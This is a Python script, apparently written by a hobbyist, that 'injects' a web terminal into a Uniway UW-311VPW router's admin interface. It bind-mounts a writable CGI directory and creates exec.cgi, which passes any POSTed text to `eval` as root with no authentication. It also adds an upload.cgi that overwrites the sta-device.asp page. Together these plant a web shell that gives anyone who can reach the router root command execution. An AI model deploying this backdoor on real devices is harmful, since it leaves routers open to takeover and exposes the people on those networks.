#!/usr/bin/env python3
"""
Uniway UW-311VPW Web Terminal Injector
Injects an interactive web terminal into the router's web interface (http://192.168.1.1/)
in the bottom-left orange box (<TD width=164 bgColor=#ef8218>).
Grants full root (UID 0) shell access with arbitrary file modification and command execution.
"""

import sys
import os
import urllib.request
import urllib.error

ROUTER_IP = "192.168.1.1"
PATCH_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "sta-device_patched.asp")

def run_serial_or_exec(cmd):
    # Try exec.cgi first
    try:
        req = urllib.request.Request(
            f"http://{ROUTER_IP}/cgi-bin/exec.cgi",
            data=cmd.encode('utf-8'),
            headers={'Content-Type': 'text/plain'}
        )
        with urllib.request.urlopen(req, timeout=4) as resp:
            return resp.read().decode('utf-8', errors='ignore')
    except Exception:
        return None

def main():
    print(f"[*] Targeting router at http://{ROUTER_IP}...")
    
    if not os.path.exists(PATCH_FILE):
        print(f"[-] Error: {PATCH_FILE} not found!")
        sys.exit(1)

    with open(PATCH_FILE, 'rb') as f:
        patch_data = f.read()
    print(f"[+] Loaded patched ASP file ({len(patch_data)} bytes)")

    # 1. Setup /tmp/cgi-bin and bind mount if not already done
    setup_sh = """
if [ ! -d /tmp/cgi-bin ]; then
    cp -r /boaroot/cgi-bin /tmp/cgi-bin
fi
mount | grep -q "/boaroot/cgi-bin" || mount -o bind /tmp/cgi-bin /boaroot/cgi-bin

cat > /tmp/cgi-bin/exec.cgi << 'EOF'
#!/bin/sh
echo "Content-Type: text/plain; charset=utf-8"
echo "Cache-Control: no-cache"
echo ""

if [ "$REQUEST_METHOD" = "POST" ]; then
    CMD=$(cat)
    eval "$CMD" 2>&1
else
    echo "Ready for commands"
fi
EOF
chmod 755 /tmp/cgi-bin/exec.cgi

cat > /tmp/cgi-bin/upload.cgi << 'EOF'
#!/bin/sh
echo "Content-Type: text/plain"
echo ""
cat > /tmp/cgi-bin/sta-device.asp
chmod 755 /tmp/cgi-bin/sta-device.asp
ls -l /tmp/cgi-bin/sta-device.asp
EOF
chmod 755 /tmp/cgi-bin/upload.cgi
"""
    print("[*] Ensuring CGI overlay & endpoints are active...")
    res = run_serial_or_exec(setup_sh)
    if res is None:
        print("[-] Notice: exec.cgi not reachable yet. If router just rebooted, run this via UART or serial console.")
    else:
        print("[+] Backend CGI handlers verified.")

    # 2. Upload patched sta-device.asp
    print("[*] Uploading sta-device_patched.asp to /boaroot/cgi-bin/sta-device.asp...")
    req = urllib.request.Request(
        f"http://{ROUTER_IP}/cgi-bin/upload.cgi",
        data=patch_data,
        headers={'Content-Type': 'application/octet-stream'}
    )
    with urllib.request.urlopen(req, timeout=10) as resp:
        out = resp.read().decode('utf-8', errors='ignore')
        print(f"[+] Server response: {out.strip()}")

    print("\n[SUCCESS] Web Terminal successfully injected!")
    print("Refresh your browser on http://192.168.1.1/ to view the terminal button in the bottom-left orange box.")

if __name__ == "__main__":
    main()
